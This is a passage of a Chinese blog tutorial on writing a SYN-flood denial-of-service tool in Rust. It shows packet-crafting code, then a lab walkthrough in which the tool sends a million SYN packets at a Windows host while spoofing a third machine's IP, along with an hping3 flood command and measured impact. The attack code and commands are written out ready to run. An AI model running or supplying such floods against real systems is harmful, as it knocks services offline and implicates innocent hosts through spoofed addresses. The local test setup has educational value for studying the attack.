+    <span class="storage type rust">let</span> <span class="storage modifier rust">mut</span> tcp_header <span class="keyword operator rust">=</span> <span class="meta path rust">MutableTcpPacket<span class="punctuation accessor rust">::</span></span>new<span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="keyword operator rust">&amp;</span><span class="storage modifier rust">mut</span> packet<span class="meta group rust"><span class="punctuation section group begin rust">[</span><span class="constant other rust">IPV4_HEADER_LEN</span><span class="keyword operator rust">..</span><span class="punctuation section group end rust">]</span></span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span>.<span class="support function rust">unwrap</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    tcp_header.<span class="support function rust">set_source</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span>rng.<span class="support function rust">gen_range</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="constant numeric integer decimal rust">1000</span><span class="keyword operator rust">..</span><span class="constant numeric integer decimal rust">5000</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    tcp_header.<span class="support function rust">set_destination</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span>port <span class="keyword operator rust">as</span> <span class="storage type rust">u16</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    tcp_header.<span class="support function rust">set_sequence</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="meta path rust">random<span class="punctuation accessor rust">::</span></span><span class="meta generic rust"><span class="punctuation definition generic begin rust">&lt;</span><span class="storage type rust">u32</span><span class="punctuation definition generic end rust">&gt;</span></span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    tcp_header.<span class="support function rust">set_flags</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="meta path rust">TcpFlags<span class="punctuation accessor rust">::</span></span><span class="constant other rust">SYN</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    tcp_header.<span class="support function rust">set_window</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span>rng.<span class="support function rust">gen_range</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="constant numeric integer decimal rust">1000</span><span class="keyword operator rust">..</span><span class="constant numeric integer decimal rust">5000</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    tcp_header.<span class="support function rust">set_data_offset</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="constant numeric integer decimal rust">8</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    tcp_header.<span class="support function rust">set_urgent_ptr</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="constant numeric integer decimal rust">0</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    tcp_header.<span class="support function rust">set_options</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="keyword operator rust">&amp;</span><span class="meta group rust"><span class="punctuation section group begin rust">[</span><span class="meta path rust">TcpOption<span class="punctuation accessor rust">::</span></span>mss<span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="constant numeric integer decimal rust">1460</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation separator rust">,</span> <span class="meta path rust">TcpOption<span class="punctuation accessor rust">::</span></span>sack_perm<span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation separator rust">,</span>  <span class="meta path rust">TcpOption<span class="punctuation accessor rust">::</span></span>nop<span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation separator rust">,</span> <span class="meta path rust">TcpOption<span class="punctuation accessor rust">::</span></span>nop<span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation separator rust">,</span> <span class="meta path rust">TcpOption<span class="punctuation accessor rust">::</span></span>wscale<span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="constant numeric integer decimal rust">7</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation section group end rust">]</span></span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    <span class="storage type rust">let</span> checksum <span class="keyword operator rust">=</span> <span class="support function rust">ipv4_checksum</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="keyword operator rust">&amp;</span>tcp_header.<span class="support function rust">to_immutable</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation separator rust">,</span> <span class="keyword operator rust">&amp;</span>ipv4_source<span class="punctuation separator rust">,</span> <span class="keyword operator rust">&amp;</span>ipv4_destination</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+
+    tcp_header.<span class="support function rust">set_checksum</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span>checksum</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+
+
+
+    <span class="meta path rust">TcpPacket<span class="punctuation accessor rust">::</span></span>new<span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="keyword operator rust">&amp;</span><span class="storage modifier rust">mut</span> packet<span class="meta group rust"><span class="punctuation section group begin rust">[</span><span class="keyword operator rust">..</span><span class="punctuation section group end rust">]</span></span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span>.<span class="support function rust">unwrap</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span>
+</span><span class="meta block rust"><span class="punctuation section block end rust">}</span></span></span>
+</span></code></pre>
+<h2 id="测试">测试</h2>
+<p>我们准备了三只鸡, 用我们的<code>攻击鸡</code>去攻击<code>出头鸡</code>,然后嫁祸给<code>躺枪鸡</code></p>
+<ul>
+<li>攻击鸡(Linux, IP:192.168.31.245)</li>
+<li>出头鸡(Win 10, IP:192.168.31.19)</li>
+<li>躺枪鸡(Linux, IP:192.168.31.102)</li>
+</ul>
+<p>在<code>出头鸡</code>上安装一个 http 服务器,监听 8000 端口, 如果不开一个应用, 来自<code>攻击鸡</code>的流量还是会传输到<code>出头鸡</code>,但是不会有后续 SYN ACK 的数据包.</p>
+<h3 id="攻击鸡-192-168-31-245">攻击鸡(192.168.31.245)</h3>
+<pre><code class="language-bash"><span class="source shell bash"><span class="meta function-call shell"><span class="variable function shell">cargo</span></span><span class="meta function-call arguments shell"> build</span>
+<span class="comment line number-sign shell"><span class="punctuation definition comment begin shell">#</span></span><span class="comment line number-sign shell"> 我的程序有四个参数</span><span class="comment line number-sign shell">
+</span> <span class="meta function-call shell"><span class="variable function shell">-t</span></span><span class="meta function-call arguments shell"> 是目标 ip</span>
+ <span class="meta function-call shell"><span class="variable function shell">-s</span></span><span class="meta function-call arguments shell"> 是源 ip , 这里局域网可以伪造</span>
+ <span class="meta function-call shell"><span class="variable function shell">-p</span></span><span class="meta function-call arguments shell"> 目标端口</span>
+ <span class="meta function-call shell"><span class="variable function shell">-c</span></span><span class="meta function-call arguments shell"> 数据包数量</span>
+<span class="meta function-call shell"><span class="variable function shell">sudo</span></span><span class="meta function-call arguments shell"> ./target/debug/syn-flood-demo<span class="variable parameter option shell"><span class="punctuation definition parameter shell"> -</span>s</span> 192.168.31.102<span class="variable parameter option shell"><span class="punctuation definition parameter shell"> -</span>t</span> 192.168.31.19<span class="variable parameter option shell"><span class="punctuation definition parameter shell"> -</span>p</span> 8000<span class="variable parameter option shell"><span class="punctuation definition parameter shell"> -</span>c</span> 1000000</span>
+
+<span class="comment line number-sign shell"><span class="punctuation definition comment begin shell">#</span></span><span class="comment line number-sign shell"> 上面这个命令在我们的攻击鸡中执行,功能就是向 192.168.31.19, 8000 端口, 发送 1000000 个数据包, 并且伪造 ip: 192.168.31.102</span><span class="comment line number-sign shell">
+</span></span></code></pre>
+<h3 id="出头鸡-192-168-31-19">出头鸡(192.168.31.19)</h3>
+<p>在出头鸡上,我们抓包查看以及看一下系统资源情况</p>
+<ul>
+<li>空闲情况</li>
+</ul>
+<p><img src="/p/rust-hacking-programing-syn-flood-ddos/target-idel.png" alt="" />空闲情况</p>
+<ul>
+<li>demo 攻击</li>
+</ul>
+<p><img src="/p/rust-hacking-programing-syn-flood-ddos/target-under-attach.png" alt="" />demo 攻击</p>
+<ul>
+<li>hping3 攻击</li>
+</ul>
+<pre><code class="language-bash"><span class="source shell bash"><span class="comment line number-sign shell"><span class="punctuation definition comment begin shell">#</span></span><span class="comment line number-sign shell">hping3 攻击命令</span><span class="comment line number-sign shell">
+</span><span class="meta function-call shell"><span class="variable function shell">sudo</span></span><span class="meta function-call arguments shell"> hping3<span class="variable parameter option shell"><span class="punctuation definition parameter shell"> -</span>i</span> u1<span class="variable parameter option shell"><span class="punctuation definition parameter shell"> -</span>S</span><span class="variable parameter option shell"><span class="punctuation definition parameter shell"> -</span>d</span> 1024<span class="variable parameter option shell"><span class="punctuation definition parameter shell"> -</span>p</span> 8080 192.168.31.19</span>
+</span></code></pre>
+<p><img src="/p/rust-hacking-programing-syn-flood-ddos/hping3-attach.png" alt="" />hping3 攻击</p>
+<h2 id="躺枪鸡">躺枪鸡</h2>
+<p><code>躺枪鸡</code>中使用 wireshark 监听到了<code>出头鸡</code> 发过来的 SYN ACK 数据包.</p>
+<p><img src="/p/rust-hacking-programing-syn-flood-ddos/not-target.png" alt="" />躺枪鸡 SYN ACK 数据包</p>
+<h2 id="补充">补充</h2>
+<ol>
+<li>测试中我们的 demo 程序攻击有 30Mbps 左右的流量, cpu 波动 10% 左右, hping3 攻击的流量平均 37Mbps 左右, 这个流量受到 WIFI 环境影响很大,比如干扰,路由器不稳定等, 写文档之前, 我用 demo 测试可以达到 90Mbps 左右, hping3 则有 170Mbps 左右, 这个应该是正常的,我们的程序只是单线程, 还有提升的空间, 只是写文档时候测试达不到那个速率.</li>
+<li>虽然 cpu 只有 10% 的波动, 但是在 <code>出头鸡</code> 做一些 io 的操作,键盘输入, 传建文件什么的相当的卡顿. 攻击不仅消耗目标的流量,而且对 io 操作影响也很大.</li>
+</ol>
+<h1 id="小结">小结</h1>
+<ul>
+<li>简单的 syn flood , 可以继续改进, 支持数据包大小等,目前发送 1024字节的 payload.</li>
+<li>外网的 IP 伪装是需要特定条件的. 现在 ISP 基本都控制了.</li>
+<li>demo 可以升级为多线程的.</li>
+<li>syn 数据包不仅可以用来 DDoS 攻击, 还可以用于端口扫描, 如果发送 SYN , 接收到了 SYN ACK, 则是端口开放,如果没有收到数据包或者收到 RST ACK 则是端口关闭.</li>
+</ul>
+
+
+      
+      <div class="divider"></div>
+      <div class="flex flex-col md:flex-row justify-between gap-4 py-4">
+        
+        
+        <a class="group btn btn-outline" href="/p/rust-project-review-zellij/" title="Rust 项目鉴赏: zellij 替代 screen, tmux 的终端工具">
+          <ion-icon name="chevron-back"></ion-icon>
+          <div class="inline-flex flex-col items-start">
+            <span class="text-base-content/60 group-hover:text-neutral-content/60 text-xs font-normal">上一篇</span>
+            <span class="max-w-48 truncate">Rust 项目鉴赏: zellij 替代 screen, tmux 的终端工具</span>
+          </div>
+        </a>
+        
+
+        
+        <a class="group btn btn-outline" href="/p/rust-hacking-programing-icmp-ping/" title="Rust 黑客编程 - ICMP 协议 ping 的简单实现">
+          <div class="inline-flex flex-col items-end">
+            <span class="text-base-content/60 group-hover:text-neutral-content/60 text-xs font-normal">下一篇</span>
+            <span class="max-w-48 truncate">Rust 黑客编程 - ICMP 协议 ping 的简单实现</span>
+          </div>
+          <ion-icon name="chevron-forward"></ion-icon>
+        </a>
+        
+      </div>
+      
+    </article>
+  </div>
+</div>
+
+
+          <footer class="flex justify-between items-center gap-2 max-w-[65ch] mx-auto px-4 md:px-0 py-12">
+            <div>
+  
+  <p>© 2016 - 2026 Liangdi&#x27;s Blog</p>
+  
+
+  
+  <p>谦和之静,厚积薄发</p>
+  
+</div>
+            
+<div
+  x-data="{ icons: [
+    { name: 'moon', status: 'y' },
+    { name: 'sunny', status: 'n' },
+    { name: 'desktop', status: 'auto' }
+  ] }"
+  class="flex items-center h-[32px] px-2 gap-2 border border-base-content/30 rounded-full"
+>
+  <template x-for="icon in icons">
+    <div
+      role="button"
+      tabindex="0"
+      :aria-label="'Select ' + icon.name + ' mode'"
+      class="group inline-flex justify-center items-center p-1 rounded-full cursor-pointer hover:bg-primary"
+      :class="$store.darkMode.icon() === icon.name && 'bg-primary'"
+      @click="$store.darkMode.toggle(icon.status)"
+    >
+      <ion-icon
+        :name="`${icon.name}-outline`"
+        class="group-hover:text-primary-content"
+        :class="$store.darkMode.icon() === icon.name && 'text-primary-content'"
+      >
+      </ion-icon>
+    </div>
+  </template>
+</div>
+          </footer>
+        </div>
+      </div>
+      <div class="back">
+        <div class="container">
+          
+          
+<div class="max-w-[65ch] mt-8 mx-auto px-4">
+  <div>
+    <div class="mb-4 text-lg font-medium">关于</div>
+    <div class="prose dark:prose-invert">
+      <p>Liangdi</p>
+      <p class="text-base-content/60">关注开源技术.</p>
+    </div>
+  </div>
+
+  
+  <div class="divider divider-vertical"></div>
+  <div class="pb-4">
+    <div class="mb-4 text-lg font-medium">社交链接</div>
+    
+<ul class="menu menu-horizontal flex-wrap w-full px-0 [&_ion-icon]:text-lg">
+  
+  
+    
+    <li>
+      <a href="" target="_blank" rel="noopener noreferrer" title="">
+        <ion-icon name="logo-"></ion-icon>
+      </a>
+    </li>
+    
+    <li>
+      <a href="" target="_blank" rel="noopener noreferrer" title="">
+        <ion-icon name="logo-"></ion-icon>
+      </a>
+    </li>
+    
+    <li>
+      <a href="" target="_blank" rel="noopener noreferrer" title="">
+        <ion-icon name="logo-"></ion-icon>
+      </a>
+    </li>
+    
+    <li>
+      <a href="" target="_blank" rel="noopener noreferrer" title="">
+        <ion-icon name="logo-"></ion-icon>
+      </a>
+    </li>
+    
+  
+</ul>
+  </div>
+  
+</div>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  
+<script>
+  window.lightTheme = "emerald"
+  window.darkTheme = "forest"
+</script>
+
+
+
+
+<script src="/js/main.js"></script>
+  
+
+
+<script src="https://cdn.jsdelivr.net/npm/luxon@1.26.0" crossorigin="anonymous"></script>
+<script>
+  format()
+
+  function format() {
+    document.querySelectorAll('span[data-format="luxon"]').forEach(el => {
+      const date = el.textContent
+      el.textContent = luxon.DateTime.fromISO(date, { locale: "zh" }).toFormat("yyyy年MM月dd日")
+    })
+  }
+</script>
+
+
+
+  
+  <script type="module">
+    import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11.1.0/dist/mermaid.esm.min.mjs';
+    mermaid.initialize({ startOnLoad: true });
+  </script>
+
+  
+
+  
+  <script type="module" src="https://unpkg.com/ionicons@7.4.0/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@7.4.0/dist/ionicons/ionicons.js"></script>
+
+  
+</body>
+</html>
